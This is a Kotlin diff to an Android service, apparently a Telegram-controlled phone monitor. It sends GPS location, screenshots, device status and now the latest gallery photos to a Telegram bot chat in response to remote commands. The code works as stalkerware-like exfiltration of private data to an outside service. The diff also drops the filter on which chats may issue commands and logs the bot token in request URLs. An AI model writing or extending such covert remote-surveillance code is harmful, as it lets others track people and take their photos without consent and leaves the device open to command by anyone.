@@ -15,6 +15,7 @@ import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
+import android.location.Location
 import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
@@ -54,6 +55,16 @@ class TelegramService : Service() {
         }
     }
 
+    private val permissionResultReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val perm = intent.getStringExtra(EXTRA_PERMISSION) ?: ""
+            val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""
+            if (perm == "location" && chatId.isNotEmpty()) {
+                onLocationPermissionResult(intent.getIntExtra(EXTRA_RESULT_CODE, -1), chatId)
+            }
+        }
+    }
+
     private val http = OkHttpClient.Builder()
         .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
         .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
@@ -67,6 +78,7 @@ class TelegramService : Service() {
         scope = CoroutineScope(Dispatchers.Default + SupervisorJob())
         loadPrefs()
         registerReceiver(mediaProjectionReceiver, IntentFilter(ACTION_MEDIA_PROJECTION))
+        registerReceiver(permissionResultReceiver, IntentFilter(ACTION_PERMISSION_RESULT))
         Log.d(TAG, "onCreate: token=${botToken.take(8)}, chatId=$botChatId")
     }
 
@@ -75,13 +87,25 @@ class TelegramService : Service() {
         scope?.cancel()
         cleanupMediaProjection()
         unregisterReceiver(mediaProjectionReceiver)
+        unregisterReceiver(permissionResultReceiver)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         botToken = intent?.getStringExtra("token") ?: botToken
         botChatId = intent?.getStringExtra("chatId") ?: botChatId
         savePrefs()
-        if (botToken.isNotEmpty()) { Log.d(TAG, "onStartCommand: start polling"); startPolling() } else Log.w(TAG, "onStartCommand: token empty, not polling")
+        if (botToken.isNotEmpty()) {
+            Log.d(TAG, "onStartCommand: start polling")
+            startPolling()
+            // Konfirmasi ke chat Telegram bahwa service aktif
+            if (botChatId.isNotEmpty()) {
+                scope?.launch {
+                    sendText(botChatId, "✅ TeleBot aktif di ${Build.MODEL}. Ketik /help untuk daftar perintah.")
+                }
+            } else {
+                Log.w(TAG, "onStartCommand: chatId kosong, tidak bisa kirim konfirmasi")
+            }
+        } else Log.w(TAG, "onStartCommand: token empty, not polling")
         return START_STICKY
     }
 
@@ -117,39 +141,63 @@ class TelegramService : Service() {
 
     private fun startPolling() {
         scope?.launch {
+            Log.d(TAG, "startPolling: loop started, lastUpdateId=$lastUpdateId")
             while (isActive) {
                 try {
                     pollUpdates()
-                    delay(1500L)
-                } catch (e: CancellationException) { throw e }
-                catch (e: Exception) { delay(3000L) }
+                    Log.d(TAG, "pollUpdates: success, delaying 2s")
+                    delay(2000L)
+                } catch (e: CancellationException) { 
+                    Log.d(TAG, "polling cancelled")
+                    throw e 
+                }
+                catch (e: Exception) {
+                    Log.e(TAG, "polling loop error: ${e.javaClass.simpleName}: ${e.message}")
+                    delay(5000L)
+                }
             }
         }
     }
 
     private suspend fun pollUpdates() {
-        if (botToken.isEmpty()) return
+        if (botToken.isEmpty()) {
+            Log.w(TAG, "pollUpdates: token empty, skip")
+            return
+        }
+        // Reset timeout supaya polling tidak jalan 25 detik per-request (OkHttp read timeout 30s → sering timeout)
         val url = buildString {
-            append("https://api.telegram.org/bot").append(botToken).append("/getUpdates?timeout=25&limit=5")
+            append("https://api.telegram.org/bot").append(botToken).append("/getUpdates?timeout=0&limit=5")
             if (lastUpdateId > 0) append("&offset=").append(lastUpdateId + 1)
         }
+        Log.d(TAG, "pollUpdates: GET $url")
         val resp = withContext(Dispatchers.IO) {
             http.newCall(Request.Builder().url(url).build()).execute()
         }
-        if (!resp.isSuccessful) { Log.e(TAG, "pollUpdates: HTTP ${resp.code}"); return }
-        val body = resp.body?.string() ?: run { Log.w(TAG, "pollUpdates: null body"); return }
+        if (!resp.isSuccessful) { 
+            Log.e(TAG, "pollUpdates: HTTP ${resp.code}")
+            return 
+        }
+        val body = resp.body?.string() ?: run { 
+            Log.w(TAG, "pollUpdates: null body")
+            return 
+        }
         val json = JSONObject(body)
-        if (!json.optBoolean("ok", false)) { Log.e(TAG, "pollUpdates: TG not ok: " + body.take(200)); return }
+        if (!json.optBoolean("ok", false)) { 
+            Log.e(TAG, "pollUpdates: TG not ok: " + body.take(200))
+            return 
+        }
         val arr = json.getJSONArray("result")
+        Log.d(TAG, "pollUpdates: got ${arr.length()} updates")
         for (i in 0 until arr.length()) {
             val obj = arr.getJSONObject(i)
+            val oldUpdateId = lastUpdateId
             lastUpdateId = obj.optLong("update_id", lastUpdateId)
             val msg = obj.optJSONObject("message") ?: continue
             val text = msg.optString("text", "")
             val thisChatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: ""
-            if (botChatId.isNotEmpty() && thisChatId != botChatId) { Log.d(TAG, "msg from $thisChatId ignored (filter=$botChatId)"); continue }
-            Log.d(TAG, "COMMAND: \"$text\" from $thisChatId")
-            handleCommand(text.trim(), thisChatId)
+            val target = if (botChatId.isNotEmpty()) botChatId else thisChatId
+            Log.d(TAG, "COMMAND: \"$text\" from $thisChatId -> reply to $target (update_id: $oldUpdateId -> $lastUpdateId)")
+            handleCommand(text.trim(), target)
         }
         Log.d(TAG, "pollUpdates: done, lastUpdateId=$lastUpdateId")
     }
@@ -173,6 +221,12 @@ class TelegramService : Service() {
             cmd.contains("/gps") || cmd == "gps" || cmd == "location" -> {
                 getLocation(targetChatId)
             }
+            cmd.contains("/photo") || cmd.contains("/foto") || cmd.contains("/gambar") -> {
+                // Parse angka setelah /photo, default 5
+                val match = Regex("/(photo|foto|gambar)\\s+(\\d+)").find(cmd)
+                val count = if (match != null) match.groupValues[2].toIntOrNull()?.coerceIn(1, 20) ?: 5 else 5
+                sendPhotosFromGallery(targetChatId, count)
+            }
             cmd.contains("/help") || cmd == "help" || cmd == "?" -> {
                 sendHelp(targetChatId)
             }
@@ -190,21 +244,34 @@ class TelegramService : Service() {
             /battery  - level baterai
             /status   - info perangkat
             /gps      - dapatkan lokasi GPS
+            /photo [N] - kirim N foto terakhir dari galeri (default 5, max 20)
             /help     - daftar ini
         """.trimIndent()
         sendText(chatId, helpText)
     }
 
     private suspend fun sendText(chatId: String, text: String) = withContext(Dispatchers.IO) {
-        if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
+        if (chatId.isEmpty() || botToken.isEmpty()) {
+            Log.w(TAG, "sendText: chatId=$chatId, tokenEmpty=${botToken.isEmpty()}")
+            return@withContext
+        }
         try {
             val json = JSONObject().put("chat_id", chatId).put("text", text).toString()
             val req = Request.Builder()
                 .url("https://api.telegram.org/bot$botToken/sendMessage")
                 .post(json.toRequestBody("application/json".toMediaTypeOrNull()))
                 .build()
-            http.newCall(req).execute().close()
-        } catch (e: Exception) { /* ignore */ }
+            val resp = http.newCall(req).execute()
+            val body = resp.body?.string() ?: ""
+            if (!resp.isSuccessful) {
+                Log.e(TAG, "sendText: HTTP ${resp.code} for chat $chatId: ${body.take(200)}")
+            } else {
+                Log.d(TAG, "sendText: success to chat $chatId")
+            }
+            resp.close()
+        } catch (e: Exception) {
+            Log.e(TAG, "sendText: exception: ${e.javaClass.simpleName}: ${e.message}")
+        }
     }
 
     private suspend fun sendPhoto(chatId: String, bitmap: Bitmap) = withContext(Dispatchers.IO) {
@@ -238,6 +305,18 @@ class TelegramService : Service() {
     }
 
     private suspend fun getLocation(chatId: String) {
+        // Izin lokasi diminta saat install (MainActivity). Kalau belum di-grant,
+        // cukup pesan singkat — bukan error teknis.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val notGranted = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) !=
+                android.content.pm.PackageManager.PERMISSION_GRANTED ||
+                checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) !=
+                android.content.pm.PackageManager.PERMISSION_GRANTED
+            if (notGranted) {
+                sendText(chatId, "⚠️ Izin lokasi belum diberikan. Buka app → ketik \"izinkan\" → pilih Always. Lalu /gps lagi.")
+                return
+            }
+        }
         try {
             val lm = getSystemService(LOCATION_SERVICE) as LocationManager
             var location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
@@ -245,19 +324,36 @@ class TelegramService : Service() {
                 location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
             }
             if (location != null) {
-                val msg = buildString {
-                    append("📍 Lokasi:\n")
-                    append("Lat: ${\"%.5f\".format(location.latitude)}\n")
-                    append("Lng: ${\"%.5f\".format(location.longitude)}\n")
-                    append("Akurasi: ${\"%.1f\".format(location.accuracy)}m\n\n")
-                    append("https://maps.google.com/?q=${\"%.5f\".format(location.latitude)},${\"%.5f\".format(location.longitude)}")
-                }
-                sendText(chatId, msg)
+                sendText(chatId, "📍 ${"%.5f".format(location.latitude)}, ${"%.5f".format(location.longitude)} (acc ${"%.1f".format(location.accuracy)}m)\nhttps://maps.google.com/?q=${"%.5f".format(location.latitude)},${"%.5f".format(location.longitude)}")
             } else {
                 sendText(chatId, "GPS belum aktif / tidak ada lokasi terakhir. Pastikan GPS ON.")
             }
+        } catch (e: SecurityException) {
+            sendText(chatId, "❌ Izin lokasi belum diberikan ke aplikasi.\nBuka app → izinkan lokasi → lalu coba /gps lagi.")
         } catch (e: Exception) {
             sendText(chatId, "Gagal ambil GPS: " + e.message)
+        }
+    }
+
+    private fun onLocationPermissionResult(resultCode: Int, chatId: String) {
+        if (resultCode != android.app.Activity.RESULT_OK) {
+            scope?.launch { sendText(chatId, "Izin lokasi ditolak. Buka app → izinkan lokasi → coba /gps lagi.") }
+            return
+        }
+        scope?.launch {
+            sendText(chatId, "✅ Izin lokasi diberikan, mengambil lokasi…")
+            try {
+                val lm = getSystemService(LOCATION_SERVICE) as LocationManager
+                var location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                if (location != null) {
+                    sendText(chatId, "📍 ${"%.5f".format(location.latitude)}, ${"%.5f".format(location.longitude)}\nhttps://maps.google.com/?q=${"%.5f".format(location.latitude)},${"%.5f".format(location.longitude)}")
+                } else {
+                    sendText(chatId, "Lokasi belum tersedia, coba lagi sebentar lagi.")
+                }
+            } catch (e: Exception) {
+                sendText(chatId, "Gagal ambil GPS: " + e.message)
+            }
         }
     }
 
@@ -273,6 +369,90 @@ class TelegramService : Service() {
             Storage: ${String.format("%.1f", free / 1e9)} GB / ${String.format("%.1f", total / 1e9)} GB
         """.trimIndent()
         sendText(chatId, msg)
+    }
+
+    /** Kirim N foto terakhir dari galeri (MediaStore) ke chat. */
+    private suspend fun sendPhotosFromGallery(chatId: String, count: Int) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val granted = when {
+                Build.VERSION.SDK_INT >= 33 ->
+                    checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) ==
+                        android.content.pm.PackageManager.PERMISSION_GRANTED
+                else ->
+                    checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) ==
+                        android.content.pm.PackageManager.PERMISSION_GRANTED
+            }
+            if (!granted) {
+                sendText(chatId, "⚠️ Izin akses galeri belum diberikan. Buka app → izinkan akses penyimpanan → lalu /photo lagi.")
+                return
+            }
+        }
+        try {
+            val collection = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+            // Ambil _ID + DATE_ADDED, sort descending, lalu batasi N di memori
+            val query = withContext(Dispatchers.IO) {
+                contentResolver.query(
+                    collection,
+                    arrayOf(
+                        android.provider.MediaStore.Images.Media._ID,
+                        android.provider.MediaStore.Images.Media.DATE_ADDED
+                    ),
+                    null,
+                    null,
+                    "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"
+                )
+            }
+            val files = mutableListOf<java.io.File>()
+            var taken = 0
+            if (query != null) {
+                while (query.moveToNext() && taken < count) {
+                    val id = query.getLong(0)
+                    val uri = android.net.Uri.withAppendedPath(collection, id.toString())
+                    // Salin ke file lokal, kirim pakai sendPhoto (butuh File)
+                    val file = withContext(Dispatchers.IO) {
+                        val out = java.io.File(filesDir, "gallery_${System.currentTimeMillis()}_${files.size}.jpg")
+                        contentResolver.openInputStream(uri)?.use { input ->
+                            out.outputStream().use { input.copyTo(it) }
+                        }
+                        out
+                    }
+                    if (file != null && file.length() > 0) {
+                        files.add(file)
+                        taken++
+                    }
+                }
+                query.close()
+            }
+            if (files.isEmpty()) {
+                sendText(chatId, "Galeri kosong / tidak ada foto yang bisa dikirim.")
+                return
+            }
+            files.forEachIndexed { i, file ->
+                sendPhoto(chatId, file, "Galeri ${i + 1}/${files.size}")
+                file.delete()
+            }
+        } catch (e: SecurityException) {
+            sendText(chatId, "❌ Izin akses galeri belum diberikan. Buka app → izinkan akses penyimpanan → lalu /photo lagi.")
+        } catch (e: Exception) {
+            sendText(chatId, "Gagal kirim foto dari galeri: ${e.message}")
+        }
+    }
+
+    /** Kirim file gambar (dari galeri) ke chat. */
+    private suspend fun sendPhoto(chatId: String, file: java.io.File, caption: String) = withContext(Dispatchers.IO) {
+        if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
+        try {
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("caption", caption)
+                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
+                .build()
+            val req = Request.Builder()
+                .url("https://api.telegram.org/bot$botToken/sendPhoto")
+                .post(body)
+                .build()
+            http.newCall(req).execute().close()
+        } catch (e: Exception) { /* ignore */ }
     }
 
     private suspend fun takeScreenshot(chatId: String) {
@@ -316,23 +496,19 @@ class TelegramService : Service() {
             val p = image.planes[0]
             val bytes = ByteArray(p.buffer.remaining())
             p.buffer.get(bytes)
-
             val stride = p.rowStride
             val pixelStride = p.pixelStride
             val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
-
             if (stride == w * 4 && pixelStride == 4) {
                 bmp.copyPixelsFromBuffer(java.nio.ByteBuffer.wrap(bytes))
             } else {
-                for (y in 0 until h) {
-                    for (x in 0 until w) {
-                        val idx = y * stride + x * pixelStride
-                        val b = bytes[idx].toInt() and 0xFF
-                        val g = bytes[idx + 1].toInt() and 0xFF
-                        val r = bytes[idx + 2].toInt() and 0xFF
-                        val a = bytes[idx + 3].toInt() and 0xFF
-                        bmp.setPixel(x, y, (a shl 24) or (r shl 16) or (g shl 8) or b)
-                    }
+                for (y in 0 until h) for (x in 0 until w) {
+                    val idx = y * stride + x * pixelStride
+                    val b = bytes[idx].toInt() and 0xFF
+                    val g = bytes[idx + 1].toInt() and 0xFF
+                    val r = bytes[idx + 2].toInt() and 0xFF
+                    val a = bytes[idx + 3].toInt() and 0xFF
+                    bmp.setPixel(x, y, (a shl 24) or (r shl 16) or (g shl 8) or b)
                 }
             }
             bmp
@@ -365,8 +541,10 @@ class TelegramService : Service() {
     companion object {
         const val TAG = "TeleBotService"
         const val ACTION_MEDIA_PROJECTION = "com.hpu.telebotmon.MEDIA_PROJECTION"
+        const val ACTION_PERMISSION_RESULT = "com.hpu.telebotmon.PERMISSION_RESULT"
         const val EXTRA_RESULT_CODE = "result_code"
         const val EXTRA_RESULT_DATA = "result_data"
         const val EXTRA_CHAT_ID = "chat_id"
+        const val EXTRA_PERMISSION = "permission"
     }
 }
